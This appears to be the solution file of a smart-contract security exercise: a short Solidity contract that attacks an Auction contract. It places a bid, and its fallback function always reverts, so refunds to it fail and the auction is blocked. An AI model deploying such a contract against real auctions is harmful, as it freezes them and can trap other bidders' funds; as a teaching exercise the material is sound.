//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;

import "hardhat/console.sol";

import "./Auction.sol";

contract AuctionBlockerAttacker {
    Auction auction;

    constructor(address auctionAddress) {
        auction = Auction(auctionAddress);
    }

    //
    // CHALLENGE: IMPLEMENT PART OF THE EXPLOIT HERE
    //
    fallback() external payable {
        revert("");
    }

    //
    // CHALLENGE: IMPLEMENT PART OF THE EXPLOIT HERE
    //
    function blockAuction() external payable {
        auction.bid{value: msg.value}();
    }
}
